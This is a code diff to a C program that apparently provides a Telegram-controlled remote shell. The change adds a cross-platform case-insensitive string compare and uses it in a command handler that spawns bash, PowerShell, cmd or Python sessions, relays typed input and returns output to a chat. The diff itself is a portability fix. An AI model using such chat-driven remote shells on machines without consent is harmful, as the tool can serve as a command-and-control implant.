@@ -538,29 +538,43 @@ int c2t_shell_run_uploaded_script(const char *file_id, const char *file_name,
   return send_shell_result(cmd_display, &result, exec_ok);
 }
 
+static int c2t_strcasecmp(const char *left, const char *right) {
+  if (!left && !right)
+    return 0;
+  if (!left)
+    return -1;
+  if (!right)
+    return 1;
+#ifdef _WIN32
+  return _stricmp(left, right);
+#else
+  return strcasecmp(left, right);
+#endif
+}
+
 int c2t_shell_session_handle_command(const char *subcommand, const char *arg) {
   const char *sub = subcommand ? subcommand : "";
   while (isspace((unsigned char)*sub))
     sub++;
 
-  if (strcasecmp(sub, "start") == 0 || strcasecmp(sub, "open") == 0 ||
-      strcasecmp(sub, "spawn") == 0) {
+  if (c2t_strcasecmp(sub, "start") == 0 || c2t_strcasecmp(sub, "open") == 0 ||
+      c2t_strcasecmp(sub, "spawn") == 0) {
     c2t_shell_type_t st = C2T_SHELL_AUTO;
     if (arg && *arg) {
       while (isspace((unsigned char)*arg)) arg++;
-      if (strcasecmp(arg, "bash") == 0) st = C2T_SHELL_BASH;
-      else if (strcasecmp(arg, "zsh") == 0) st = C2T_SHELL_ZSH;
-      else if (strcasecmp(arg, "ps") == 0 || strcasecmp(arg, "powershell") == 0 || strcasecmp(arg, "pwsh") == 0) st = C2T_SHELL_POWERSHELL;
-      else if (strcasecmp(arg, "cmd") == 0) st = C2T_SHELL_CMD;
-      else if (strcasecmp(arg, "py") == 0 || strcasecmp(arg, "python") == 0 || strcasecmp(arg, "python3") == 0) st = C2T_SHELL_PYTHON;
+      if (c2t_strcasecmp(arg, "bash") == 0) st = C2T_SHELL_BASH;
+      else if (c2t_strcasecmp(arg, "zsh") == 0) st = C2T_SHELL_ZSH;
+      else if (c2t_strcasecmp(arg, "ps") == 0 || c2t_strcasecmp(arg, "powershell") == 0 || c2t_strcasecmp(arg, "pwsh") == 0) st = C2T_SHELL_POWERSHELL;
+      else if (c2t_strcasecmp(arg, "cmd") == 0) st = C2T_SHELL_CMD;
+      else if (c2t_strcasecmp(arg, "py") == 0 || c2t_strcasecmp(arg, "python") == 0 || c2t_strcasecmp(arg, "python3") == 0) st = C2T_SHELL_PYTHON;
     }
     char msg[3000];
     (void)c2t_shell_session_start(st, msg, sizeof(msg));
     return telegram_send_html(msg);
   }
 
-  if (strcasecmp(sub, "in") == 0 || strcasecmp(sub, "input") == 0 ||
-      strcasecmp(sub, "write") == 0 || strcasecmp(sub, "send") == 0) {
+  if (c2t_strcasecmp(sub, "in") == 0 || c2t_strcasecmp(sub, "input") == 0 ||
+      c2t_strcasecmp(sub, "write") == 0 || c2t_strcasecmp(sub, "send") == 0) {
     if (!arg || !*arg) {
       return telegram_send_html(
           "⚠️ <b>Usage:</b> <code>/sh_in &lt;command/text&gt;</code>\n"
@@ -578,14 +592,14 @@ int c2t_shell_session_handle_command(const char *subcommand, const char *arg) {
     return send_shell_result(disp, &res, 1);
   }
 
-  if (strcasecmp(sub, "stop") == 0 || strcasecmp(sub, "exit") == 0 ||
-      strcasecmp(sub, "close") == 0 || strcasecmp(sub, "kill") == 0) {
+  if (c2t_strcasecmp(sub, "stop") == 0 || c2t_strcasecmp(sub, "exit") == 0 ||
+      c2t_strcasecmp(sub, "close") == 0 || c2t_strcasecmp(sub, "kill") == 0) {
     char msg[1024];
     (void)c2t_shell_session_stop(msg, sizeof(msg));
     return telegram_send_html(msg);
   }
 
-  if (strcasecmp(sub, "status") == 0 || strcasecmp(sub, "info") == 0) {
+  if (c2t_strcasecmp(sub, "status") == 0 || c2t_strcasecmp(sub, "info") == 0) {
     c2t_shell_session_info_t info;
     if (c2t_shell_session_get_info(&info) && info.is_active) {
       char msg[1024];
